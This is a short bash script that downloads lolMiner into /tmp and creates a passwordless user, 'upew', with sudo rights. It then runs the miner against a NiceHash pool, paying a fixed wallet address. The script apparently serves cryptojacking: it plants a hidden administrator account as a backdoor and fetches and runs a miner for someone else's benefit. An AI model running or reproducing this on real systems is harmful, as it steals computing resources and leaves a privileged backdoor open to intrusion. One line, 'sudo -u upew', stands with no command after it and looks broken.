#!/bin/bash
cd /tmp
wget -O lolminer.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
tar xvfz lolminer.tar.gz
cd 1.28a
sudo adduser --disabled-password --gecos "" upew && sudo usermod -aG sudo upew
sudo -u upew 
./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-99999 -n 1)-GPU) --ethstratum ETHPROXY
